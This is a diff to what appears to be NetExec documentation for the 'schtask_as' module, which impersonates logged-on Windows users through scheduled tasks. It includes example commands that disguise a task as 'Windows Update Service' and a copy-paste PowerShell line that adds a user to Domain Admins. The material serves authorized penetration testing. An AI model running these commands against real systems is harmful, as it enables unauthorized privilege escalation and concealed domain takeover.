@@ -6,8 +6,6 @@ description: >-
 
 # 🆕 Impersonate logged-on Users
 
-
-
 {% hint style="warning" %}
 You need at least local admin privilege on the remote target
 {% endhint %}
@@ -28,21 +26,23 @@ nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user
 
 <figure><img src="../.gitbook/assets/schtask_as.png" alt=""><figcaption></figcaption></figure>
 
+### Module options:
 
-### 3. Module options: 
 ```
-TASK - Change the task name
-FILE - Change the file name
-LOCATION change the location where files will be written to on the host
+CMD            Command to execute
+USER           User to execute command as
+TASK           OPTIONAL: Set a name for the scheduled task name
+FILE           OPTIONAL: Set a name for the command output file
+LOCATION       OPTIONAL: Set a location for the command output file (e.g. '\tmp\')
 ```
 
 Example:
+
 ```
 nxc smb [] -u [] -p [] --local-auth -M schtask_as -o USER=[target] CMD="whoami" TASK="Windows Update Service" FILE="update.log" LOCATION="\\Windows\\Tasks\\"
 ```
 
-
-Custom command to add a user to the domain admin group for easy copy\&pasting:&#x20;
+Custom command to add a user to the domain admin group for easy copy\&pasting:
 
 ```
 powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
